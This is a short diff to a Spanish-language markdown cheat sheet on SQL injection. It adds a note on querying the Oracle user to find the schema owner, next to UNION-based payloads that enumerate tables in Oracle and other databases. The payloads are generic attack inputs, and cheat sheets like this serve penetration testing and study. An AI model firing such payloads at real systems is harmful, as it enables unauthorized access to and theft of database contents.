@@ -42,6 +42,9 @@ donde
 		``` mysql
 		'AQUI SOLO VA UNA COMILLA' union select table_name from all_tables where owner='NOMBRE_DEL_ESQUEMA'-- -
 		```
+
+		*\*Nota*: `select user from dual` para obtener el owner.
+		
 	- En No Oracle Databases:
 		``` mysql
 		'AQUI SOLO VA UNA COMILLA' union select table_name from information_schema.tables where table_schema='NOMBRE_DEL_ESQUEMA'-- -
